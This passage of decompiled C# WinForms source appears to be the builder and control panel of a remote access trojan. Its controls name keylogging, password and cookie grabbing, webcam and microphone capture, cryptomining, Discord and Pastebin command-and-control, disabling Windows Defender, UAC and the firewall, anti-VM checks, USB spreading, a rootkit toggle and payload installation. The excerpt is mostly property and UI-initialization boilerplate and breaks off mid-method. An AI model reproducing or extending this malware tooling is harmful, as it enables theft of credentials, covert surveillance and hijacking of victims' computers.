			guna2Button_12 = value;
		}
	}

	internal virtual Guna2Button Notf_pass
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_13;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_13 = value;
		}
	}

	protected internal virtual ListView List_pass
	{
		[CompilerGenerated]
		get
		{
			return listView_4;
		}
		[CompilerGenerated]
		set
		{
			listView_4 = value;
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel14
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_13;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_13 = value;
		}
	}

	public virtual TabPage Passwords
	{
		[CompilerGenerated]
		get
		{
			return tabPage_14;
		}
		[CompilerGenerated]
		set
		{
			tabPage_14 = value;
		}
	}

	public virtual TabPage Miner
	{
		[CompilerGenerated]
		get
		{
			return tabPage_15;
		}
		[CompilerGenerated]
		set
		{
			tabPage_15 = value;
		}
	}

	public virtual TabPage Grabberff
	{
		[CompilerGenerated]
		get
		{
			return tabPage_16;
		}
		[CompilerGenerated]
		set
		{
			tabPage_16 = value;
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem29
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_54;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_118;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_54;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_54 = value;
			toolStripMenuItem = toolStripMenuItem_54;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel15
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_14;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_14 = value;
		}
	}

	protected internal virtual ListView L1_Miner
	{
		[CompilerGenerated]
		get
		{
			return wmlGqvJgny;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_119;
			ListView listView = wmlGqvJgny;
			if (listView != null)
			{
				listView.SelectedIndexChanged -= value2;
			}
			wmlGqvJgny = value;
			listView = wmlGqvJgny;
			if (listView != null)
			{
				listView.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel16
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_15;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_15 = value;
		}
	}

	protected internal virtual ListView L1_Grabber
	{
		[CompilerGenerated]
		get
		{
			return listView_5;
		}
		[CompilerGenerated]
		set
		{
			listView_5 = value;
		}
	}

	internal virtual Guna2Button NOTF_BRBS1
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_14;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_14 = value;
		}
	}

	public virtual PictureBox PictureBox31
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_79;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_79 = value;
		}
	}

	protected virtual Label Label91
	{
		[CompilerGenerated]
		get
		{
			return label_82;
		}
		[CompilerGenerated]
		set
		{
			label_82 = value;
		}
	}

	internal virtual Guna2ToggleSwitch MBRBZ
	{
		[CompilerGenerated]
		get
		{
			return LbbnyRuehY;
		}
		[CompilerGenerated]
		set
		{
			LbbnyRuehY = value;
		}
	}

	internal virtual Panel Panel28
	{
		[CompilerGenerated]
		get
		{
			return panel_35;
		}
		[CompilerGenerated]
		set
		{
			PaintEventHandler value2 = method_121;
			Panel panel = panel_35;
			if (panel != null)
			{
				panel.Paint -= value2;
			}
			panel_35 = value;
			panel = panel_35;
			if (panel != null)
			{
				panel.Paint += value2;
			}
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel17
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_16;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_16 = value;
		}
	}

	protected internal virtual ListView Logisx
	{
		[CompilerGenerated]
		get
		{
			return listView_6;
		}
		[CompilerGenerated]
		set
		{
			listView_6 = value;
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem30
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_55;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = RnEsVdReuu;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_55;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_55 = value;
			toolStripMenuItem = toolStripMenuItem_55;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	public virtual PictureBox PictureBox26
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_80;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_80 = value;
		}
	}

	protected virtual Label Label40
	{
		[CompilerGenerated]
		get
		{
			return label_83;
		}
		[CompilerGenerated]
		set
		{
			label_83 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Cookies
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_47;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_47 = value;
		}
	}

	internal virtual Panel Panel29
	{
		[CompilerGenerated]
		get
		{
			return panel_36;
		}
		[CompilerGenerated]
		set
		{
			panel_36 = value;
		}
	}

	public virtual PictureBox PictureBox28
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_81;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_81 = value;
		}
	}

	protected virtual Label Label44
	{
		[CompilerGenerated]
		get
		{
			return label_84;
		}
		[CompilerGenerated]
		set
		{
			label_84 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Encrypt
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_48;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_139;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_48;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_48 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_48;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual Guna2TextBox TXT_SPOOFING
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_25;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_25 = value;
		}
	}

	public virtual PictureBox PictureBox77
	{
		[CompilerGenerated]
		get
		{
			return afxnWeqRcY;
		}
		[CompilerGenerated]
		set
		{
			afxnWeqRcY = value;
		}
	}

	protected virtual Label Label92
	{
		[CompilerGenerated]
		get
		{
			return label_85;
		}
		[CompilerGenerated]
		set
		{
			label_85 = value;
		}
	}

	internal virtual Guna2ToggleSwitch SPOFFING
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_49;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_124;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_49;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_49 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_49;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual Guna2Button NOTF_COK
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_15;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_15 = value;
		}
	}

	internal virtual Panel Panel30
	{
		[CompilerGenerated]
		get
		{
			return panel_37;
		}
		[CompilerGenerated]
		set
		{
			panel_37 = value;
		}
	}

	public virtual Panel Panel40
	{
		[CompilerGenerated]
		get
		{
			return panel_38;
		}
		[CompilerGenerated]
		set
		{
			panel_38 = value;
		}
	}

	public virtual Panel Panel41
	{
		[CompilerGenerated]
		get
		{
			return panel_39;
		}
		[CompilerGenerated]
		set
		{
			panel_39 = value;
		}
	}

	internal virtual Guna2Button Scan_pass
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_16;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_16 = value;
		}
	}

	public virtual Label Label17
	{
		[CompilerGenerated]
		get
		{
			return label_86;
		}
		[CompilerGenerated]
		set
		{
			label_86 = value;
		}
	}

	public virtual PictureBox PictureBox86
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_82;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_82 = value;
		}
	}

	public virtual Panel Panel42
	{
		[CompilerGenerated]
		get
		{
			return panel_40;
		}
		[CompilerGenerated]
		set
		{
			panel_40 = value;
		}
	}

	internal virtual Guna2Button Pass_len
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_17;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_17 = value;
		}
	}

	public virtual Label Label93
	{
		[CompilerGenerated]
		get
		{
			return label_87;
		}
		[CompilerGenerated]
		set
		{
			label_87 = value;
		}
	}

	public virtual PictureBox PictureBox87
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_83;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_83 = value;
		}
	}

	public virtual Label Label94
	{
		[CompilerGenerated]
		get
		{
			return label_88;
		}
		[CompilerGenerated]
		set
		{
			label_88 = value;
		}
	}

	internal virtual Guna2CircleProgressBar Guna2CircleProgressBar2
	{
		[CompilerGenerated]
		get
		{
			return guna2CircleProgressBar_3;
		}
		[CompilerGenerated]
		set
		{
			guna2CircleProgressBar_3 = value;
		}
	}

	public virtual PictureBox PictureBox88
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_84;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_84 = value;
		}
	}

	public virtual Panel Panel43
	{
		[CompilerGenerated]
		get
		{
			return zrnniJxxmQ;
		}
		[CompilerGenerated]
		set
		{
			zrnniJxxmQ = value;
		}
	}

	public virtual Panel Panel44
	{
		[CompilerGenerated]
		get
		{
			return panel_41;
		}
		[CompilerGenerated]
		set
		{
			panel_41 = value;
		}
	}

	internal virtual Guna2Button Mining_Scan
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_18;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_18 = value;
		}
	}

	public virtual Label Label95
	{
		[CompilerGenerated]
		get
		{
			return label_89;
		}
		[CompilerGenerated]
		set
		{
			label_89 = value;
		}
	}

	public virtual PictureBox PictureBox89
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_85;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_85 = value;
		}
	}

	public virtual Panel Panel45
	{
		[CompilerGenerated]
		get
		{
			return panel_42;
		}
		[CompilerGenerated]
		set
		{
			panel_42 = value;
		}
	}

	internal virtual Guna2Button Mining_len
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_19;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_19 = value;
		}
	}

	public virtual Label Label96
	{
		[CompilerGenerated]
		get
		{
			return jVlnoMaKpm;
		}
		[CompilerGenerated]
		set
		{
			jVlnoMaKpm = value;
		}
	}

	public virtual PictureBox PictureBox90
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_86;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_86 = value;
		}
	}

	public virtual Label Label97
	{
		[CompilerGenerated]
		get
		{
			return label_90;
		}
		[CompilerGenerated]
		set
		{
			label_90 = value;
		}
	}

	internal virtual Guna2CircleProgressBar Guna2CircleProgressBar3
	{
		[CompilerGenerated]
		get
		{
			return guna2CircleProgressBar_4;
		}
		[CompilerGenerated]
		set
		{
			guna2CircleProgressBar_4 = value;
		}
	}

	public virtual PictureBox PictureBox91
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_87;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = QvYsnPtmw6;
			PictureBox pictureBox = pictureBox_87;
			if (pictureBox != null)
			{
				pictureBox.Click -= value2;
			}
			pictureBox_87 = value;
			pictureBox = pictureBox_87;
			if (pictureBox != null)
			{
				pictureBox.Click += value2;
			}
		}
	}

	public virtual Panel Panel46
	{
		[CompilerGenerated]
		get
		{
			return panel_43;
		}
		[CompilerGenerated]
		set
		{
			panel_43 = value;
		}
	}

	public virtual Panel Panel47
	{
		[CompilerGenerated]
		get
		{
			return panel_44;
		}
		[CompilerGenerated]
		set
		{
			panel_44 = value;
		}
	}

	internal virtual Guna2Button Grabber_Scan
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_20;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_20 = value;
		}
	}

	public virtual Label Label98
	{
		[CompilerGenerated]
		get
		{
			return label_91;
		}
		[CompilerGenerated]
		set
		{
			label_91 = value;
		}
	}

	public virtual PictureBox PictureBox92
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_88;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_88 = value;
		}
	}

	public virtual Panel Panel48
	{
		[CompilerGenerated]
		get
		{
			return panel_45;
		}
		[CompilerGenerated]
		set
		{
			panel_45 = value;
		}
	}

	internal virtual Guna2Button Grabber_len
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_21;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_21 = value;
		}
	}

	public virtual Label Label99
	{
		[CompilerGenerated]
		get
		{
			return label_92;
		}
		[CompilerGenerated]
		set
		{
			label_92 = value;
		}
	}

	public virtual PictureBox PictureBox93
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_89;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_89 = value;
		}
	}

	public virtual Label Label100
	{
		[CompilerGenerated]
		get
		{
			return label_93;
		}
		[CompilerGenerated]
		set
		{
			label_93 = value;
		}
	}

	internal virtual Guna2CircleProgressBar Guna2CircleProgressBar4
	{
		[CompilerGenerated]
		get
		{
			return guna2CircleProgressBar_5;
		}
		[CompilerGenerated]
		set
		{
			guna2CircleProgressBar_5 = value;
		}
	}

	public virtual PictureBox PictureBox94
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_90;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_90 = value;
		}
	}

	public virtual Panel Panel49
	{
		[CompilerGenerated]
		get
		{
			return panel_46;
		}
		[CompilerGenerated]
		set
		{
			panel_46 = value;
		}
	}

	public virtual Panel Panel50
	{
		[CompilerGenerated]
		get
		{
			return panel_47;
		}
		[CompilerGenerated]
		set
		{
			panel_47 = value;
		}
	}

	internal virtual Guna2Button Cookies_scan
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_22;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_22 = value;
		}
	}

	public virtual Label Label101
	{
		[CompilerGenerated]
		get
		{
			return label_94;
		}
		[CompilerGenerated]
		set
		{
			label_94 = value;
		}
	}

	public virtual PictureBox PictureBox95
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_91;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_91 = value;
		}
	}

	public virtual Panel Panel51
	{
		[CompilerGenerated]
		get
		{
			return panel_48;
		}
		[CompilerGenerated]
		set
		{
			panel_48 = value;
		}
	}

	internal virtual Guna2Button Cookies_len
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_23;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_23 = value;
		}
	}

	public virtual Label Label102
	{
		[CompilerGenerated]
		get
		{
			return label_95;
		}
		[CompilerGenerated]
		set
		{
			label_95 = value;
		}
	}

	public virtual PictureBox PictureBox96
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_92;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_92 = value;
		}
	}

	public virtual Label Label103
	{
		[CompilerGenerated]
		get
		{
			return label_96;
		}
		[CompilerGenerated]
		set
		{
			label_96 = value;
		}
	}

	internal virtual Guna2CircleProgressBar Guna2CircleProgressBar5
	{
		[CompilerGenerated]
		get
		{
			return guna2CircleProgressBar_6;
		}
		[CompilerGenerated]
		set
		{
			guna2CircleProgressBar_6 = value;
		}
	}

	public virtual PictureBox PictureBox97
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_93;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_93 = value;
		}
	}

	internal virtual RichTextBox Box1
	{
		[CompilerGenerated]
		get
		{
			return richTextBox_0;
		}
		[CompilerGenerated]
		set
		{
			richTextBox_0 = value;
		}
	}

	public virtual Panel pnlNav
	{
		[CompilerGenerated]
		get
		{
			return panel_49;
		}
		[CompilerGenerated]
		set
		{
			panel_49 = value;
		}
	}

	internal virtual RichTextBox Box2
	{
		[CompilerGenerated]
		get
		{
			return richTextBox_1;
		}
		[CompilerGenerated]
		set
		{
			richTextBox_1 = value;
		}
	}

	public virtual Panel Panel26
	{
		[CompilerGenerated]
		get
		{
			return panel_50;
		}
		[CompilerGenerated]
		set
		{
			panel_50 = value;
		}
	}

	public virtual PictureBox PictureBox18
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_94;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_94 = value;
		}
	}

	public virtual Label Label38
	{
		[CompilerGenerated]
		get
		{
			return label_97;
		}
		[CompilerGenerated]
		set
		{
			label_97 = value;
		}
	}

	public virtual PictureBox PictureBox98
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_95;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_95 = value;
		}
	}

	internal virtual Button Button12
	{
		[CompilerGenerated]
		get
		{
			return button_16;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_135;
			Button button = button_16;
			if (button != null)
			{
				button.Click -= value2;
			}
			button_16 = value;
			button = button_16;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button Button11
	{
		[CompilerGenerated]
		get
		{
			return button_17;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_136;
			Button button = button_17;
			if (button != null)
			{
				button.Click -= value2;
			}
			button_17 = value;
			button = button_17;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual RichTextBox RichTextBox2
	{
		[CompilerGenerated]
		get
		{
			return richTextBox_2;
		}
		[CompilerGenerated]
		set
		{
			richTextBox_2 = value;
		}
	}

	internal virtual RichTextBox RichTextBox1
	{
		[CompilerGenerated]
		get
		{
			return richTextBox_3;
		}
		[CompilerGenerated]
		set
		{
			richTextBox_3 = value;
		}
	}

	internal virtual Guna2ComboBox Guna2ComboBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2ComboBox_6;
		}
		[CompilerGenerated]
		set
		{
			guna2ComboBox_6 = value;
		}
	}

	internal virtual Guna2RatingStar LEVEL
	{
		[CompilerGenerated]
		get
		{
			return guna2RatingStar_0;
		}
		[CompilerGenerated]
		set
		{
			guna2RatingStar_0 = value;
		}
	}

	static Form1()
	{
		List_Anti = "List_Anti";
		numx = null;
		Pas_user = null;
		Pas_os = null;
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	public void method_0()
	{
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		DataGridViewCellStyle dataGridViewCellStyle = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle2 = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle3 = new DataGridViewCellStyle();
		ContextMenuStrip1 = new ContextMenuStrip(icontainer_0);
		ManagerToolStripMenuItem = new ToolStripMenuItem();
		ManagerToolStripMenuItem2 = new ToolStripMenuItem();
		ControllToolStripMenuItem = new ToolStripMenuItem();
		InformationsToolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem4 = new ToolStripMenuItem();
		ToolStripMenuItem23 = new ToolStripMenuItem();
		ToolStripMenuItem5 = new ToolStripMenuItem();
		ToolStripMenuItem6 = new ToolStripMenuItem();
		ToolStripMenuItem7 = new ToolStripMenuItem();
		ToolStripMenuItem8 = new ToolStripMenuItem();
		ToolStripMenuItem9 = new ToolStripMenuItem();
		ToolStripMenuItem2 = new ToolStripMenuItem();
		ToolStripMenuItem18 = new ToolStripMenuItem();
		ToolStripMenuItem14 = new ToolStripMenuItem();
		FunToolStripMenuItem1 = new ToolStripMenuItem();
		ToolStripMenuItem12 = new ToolStripMenuItem();
		ToolStripMenuItem22 = new ToolStripMenuItem();
		ToolStripMenuItem13 = new ToolStripMenuItem();
		RunFileToolStripMenuItem = new ToolStripMenuItem();
		FromLinkToolStripMenuItem = new ToolStripMenuItem();
		FromDiskToolStripMenuItem = new ToolStripMenuItem();
		ScriptToolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem1 = new ToolStripMenuItem();
		RemoteDesktopToolStripMenuItem = new ToolStripMenuItem();
		DesktopToolStripMenuItem = new ToolStripMenuItem();
		CameraToolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem16 = new ToolStripMenuItem();
		ToolStripMenuItem25 = new ToolStripMenuItem();
		ToolStripMenuItem21 = new ToolStripMenuItem();
		ToolStripMenuItem17 = new ToolStripMenuItem();
		ToolStripMenuItem20 = new ToolStripMenuItem();
		MicrophoneToolStripMenuItem = new ToolStripMenuItem();
		KeyloggerToolStripMenuItem = new ToolStripMenuItem();
		GetPasswordsToolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem3 = new ToolStripMenuItem();
		ToolStripMenuItem10 = new ToolStripMenuItem();
		ToolStripMenuItem15 = new ToolStripMenuItem();
		ServerToolStripMenuItem = new ToolStripMenuItem();
		VirusToolStripMenuItem = new ToolStripMenuItem();
		DisableWindowsToolStripMenuItem = new ToolStripMenuItem();
		NgrokToolStripMenuItem = new ToolStripMenuItem();
		InstallToolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem11 = new ToolStripMenuItem();
		RevarseProxyToolStripMenuItem1 = new ToolStripMenuItem();
		ToolStripMenuItem24 = new ToolStripMenuItem();
		OpenChatToolStripMenuItem = new ToolStripMenuItem();
		OpenFolderToolStripMenuItem = new ToolStripMenuItem();
		vmethod_1(new ImageList(icontainer_0));
		NotifyIcon1 = new NotifyIcon(icontainer_0);
		ContextMenuStrip2 = new ContextMenuStrip(icontainer_0);
		RestartToolStripMenuItem1 = new ToolStripMenuItem();
		ShowToolStripMenuItem = new ToolStripMenuItem();
		ExitToolStripMenuItem = new ToolStripMenuItem();
		vmethod_3(new System.Windows.Forms.Timer(icontainer_0));
		vmethod_5(new Guna2AnimateWindow(icontainer_0));
		vmethod_9(new Guna2Elipse(icontainer_0));
		P1 = new Guna2Panel();
		Panel6 = new Panel();
		Pp1 = new Pp1();
		panel9 = new Panel();
		Label1 = new Label();
		TextBox1 = new Guna2TextBox();
		label16 = new Label();
		panel8 = new Panel();
		LEVEL = new Guna2RatingStar();
		SRR = new Label();
		Ftime = new Label();
		Flevel = new Label();
		Fname = new Label();
		LinkLabel1 = new LinkLabel();
		PictureBox20 = new PictureBox();
		Label24 = new Label();
		Label32 = new Label();
		Label18 = new Label();
		Label14 = new Label();
		Label2 = new Label();
		ProgressBar1 = new Guna2RadialGauge();
		PictureBox21 = new PictureBox();
		PictureBox22 = new PictureBox();
		Label13 = new Label();
		PictureBox19 = new PictureBox();
		panel4 = new Panel();
		PLW = new Guna2CircleProgressBar();
		CO = new Label();
		label4 = new Label();
		Guna2ControlBox1 = new Guna2ControlBox();
		vmethod_11(new System.Windows.Forms.Timer(icontainer_0));
		vmethod_13(new Guna2BorderlessForm(icontainer_0));
		vmethod_15(new FolderBrowserDialog());
		TabControl1 = new TabControl();
		A = new TabPage();
		B = new TabPage();
		Panel19 = new Panel();
		UP = new Guna2Button();
		PictureBox11 = new PictureBox();
		Label30 = new Label();
		Panel18 = new Panel();
		Label3 = new Guna2Button();
		PictureBox10 = new PictureBox();
		Label29 = new Label();
		Panel17 = new Panel();
		Sel = new Guna2Button();
		PictureBox9 = new PictureBox();
		Label20 = new Label();
		Panel16 = new Panel();
		PictureBox7 = new PictureBox();
		Onl = new Guna2Button();
		Label26 = new Label();
		L1 = new L1();
		C = new TabPage();
		Guna2GradientPanel4 = new Guna2GradientPanel();
		Button7 = new Button();
		Button6 = new Button();
		Button5 = new Button();
		Button4 = new Button();
		Button3 = new Button();
		Button2 = new Button();
		Button1 = new Button();
		Guna2GradientPanel3 = new Guna2GradientPanel();
		Guna2GradientPanel2 = new Guna2GradientPanel();
		Guna2GradientPanel1 = new Guna2GradientPanel();
		TabControl2 = new TabControl();
		Connect1 = new TabPage();
		CCC = new Panel();
		Guna2GradientPanel5 = new Guna2GradientPanel();
		ListView_Socket = new ListView();
		vmethod_84(new ColumnHeader());
		vmethod_86(new ColumnHeader());
		vmethod_88(new ColumnHeader());
		Remove_List_Connection = new ContextMenuStrip(icontainer_0);
		ToolStripMenuItem19 = new ToolStripMenuItem();
		ToolStripMenuItem26 = new ToolStripMenuItem();
		PictureBox33 = new PictureBox();
		Label22 = new Label();
		Pastebin = new RadioButton();
		IPDNS = new RadioButton();
		Add_Socket = new Guna2GradientButton();
		host = new Guna2TextBox();
		Ports = new Guna2TextBox();
		NameClient = new Guna2TextBox();
		Guna2GradientPanel7 = new Guna2GradientPanel();
		PictureBox23 = new PictureBox();
		Num_Delay = new Guna2TextBox();
		Discord_URL = new Guna2TextBox();
		PictureBox30 = new PictureBox();
		Label45 = new Label();
		Discord = new Guna2ToggleSwitch();
		PictureBox32 = new PictureBox();
		Label47 = new Label();
		PictureBox34 = new PictureBox();
		Delay = new Guna2ToggleSwitch();
		Encrypt_ifo = new Guna2ToggleSwitch();
		Label48 = new Label();
		PictureBox15 = new PictureBox();
		Label46 = new Label();
		Rndm = new Guna2TextBox();
		PictureBox35 = new PictureBox();
		Label52 = new Label();
		Add_Firewall = new Guna2ToggleSwitch();
		PictureBox37 = new PictureBox();
		TurnOff_Firewall = new Guna2ToggleSwitch();
		Label54 = new Label();
		Install1 = new TabPage();
		Panel13 = new Panel();
		Panel11 = new Panel();
		PictureBox51 = new PictureBox();
		Protect_Spreading = new Guna2ToggleSwitch();
		Label73 = new Label();
		PictureBox50 = new PictureBox();
		Protect_Startup = new Guna2ToggleSwitch();
		Label72 = new Label();
		PictureBox49 = new PictureBox();
		Protect_Install = new Guna2ToggleSwitch();
		Label71 = new Label();
		Guna2GradientPanel9 = new Guna2GradientPanel();
		Label70 = new Label();
		PictureBox60 = new PictureBox();
		MSG = new Guna2ToggleSwitch();
		PictureBox48 = new PictureBox();
		PictureBox44 = new PictureBox();
		PictureBox59 = new PictureBox();
		Rotk = new Guna2ToggleSwitch();
		Label68 = new Label();
		PictureBox47 = new PictureBox();
		Label66 = new Label();
		h_file = new Guna2ToggleSwitch();
		Hide_install = new Guna2ToggleSwitch();
		Label63 = new Label();
		PictureBox45 = new PictureBox();
		Run_UAC = new Guna2ToggleSwitch();
		Label64 = new Label();
		PictureBox46 = new PictureBox();
		Label65 = new Label();
		UAC = new Guna2ToggleSwitch();
		PictureBox57 = new PictureBox();
		AntiVM = new Guna2ToggleSwitch();
		Label67 = new Label();
		PictureBox58 = new PictureBox();
		Label69 = new Label();
		Protect_Process = new Guna2ToggleSwitch();
		Guna2GradientPanel6 = new Guna2GradientPanel();
		PictureBox56 = new PictureBox();
		PictureBox43 = new PictureBox();
		Guna2Separator1 = new Guna2Separator();
		USB = new Guna2ToggleSwitch();
		PictureBox24 = new PictureBox();
		Label62 = new Label();
		Run_Explorer = new Guna2ToggleSwitch();
		PictureBox38 = new PictureBox();
		Label7 = new Label();
		Create_lnk = new Guna2ToggleSwitch();
		D4 = new Guna2RadioButton();
		Label49 = new Label();
		D6 = new Guna2RadioButton();
		PictureBox40 = new PictureBox();
		Label57 = new Label();
		D1 = new Guna2RadioButton();
		Auto_Startup = new Guna2ToggleSwitch();
		D2 = new Guna2RadioButton();
		PictureBox41 = new PictureBox();
		D7 = new Guna2RadioButton();
		Create_vbs = new Guna2ToggleSwitch();
		Label43 = new Label();
		Label58 = new Label();
		D3 = new Guna2RadioButton();
		PictureBox54 = new PictureBox();
		Install_Payload = new Guna2ToggleSwitch();
		PictureBox55 = new PictureBox();
		D5 = new Guna2RadioButton();
		PictureBox53 = new PictureBox();
		D8 = new Guna2RadioButton();
		PictureBox52 = new PictureBox();
		Name_Payload = new Guna2TextBox();
		PictureBox42 = new PictureBox();
		Name_Folder = new Guna2TextBox();
		Stxt = new Guna2ToggleSwitch();
		Szip = new Guna2ToggleSwitch();
		Label61 = new Label();
		Label37 = new Label();
		PictureBox39 = new PictureBox();
		PictureBox36 = new PictureBox();
		Label53 = new Label();
		Label15 = new Label();
		Sexe = new Guna2ToggleSwitch();
		Srar = new Guna2ToggleSwitch();
		PictureBox29 = new PictureBox();
		Security1 = new TabPage();
		Panel23 = new Panel();
		Guna2GradientPanel10 = new Guna2GradientPanel();
		PictureBox69 = new PictureBox();
		PictureBox17 = new PictureBox();
		Kill_Process = new Guna2ToggleSwitch();
		Label51 = new Label();
		PictureBox68 = new PictureBox();
		Label5 = new Label();
		Disable_Control = new Guna2ToggleSwitch();
		Delete_SRS = new Guna2ToggleSwitch();
		Label75 = new Label();
		PictureBox62 = new PictureBox();
		PictureBox63 = new PictureBox();
		Label76 = new Label();
		Label50 = new Label();
		PictureBox64 = new PictureBox();
		Disable_Task = new Guna2ToggleSwitch();
		Disable_UAC = new Guna2ToggleSwitch();
		WD_exception = new Guna2ToggleSwitch();
		Label77 = new Label();
		PictureBox66 = new PictureBox();
		Label79 = new Label();
		Disable_WD = new Guna2ToggleSwitch();
		PictureBox67 = new PictureBox();
		Disable_Hide = new Guna2ToggleSwitch();
		Label80 = new Label();
		Tab_Process = new Guna2GradientPanel();
		Listkill = new ListView();
		vmethod_92(new ColumnHeader());
		Remove_List_Kill = new ContextMenuStrip(icontainer_0);
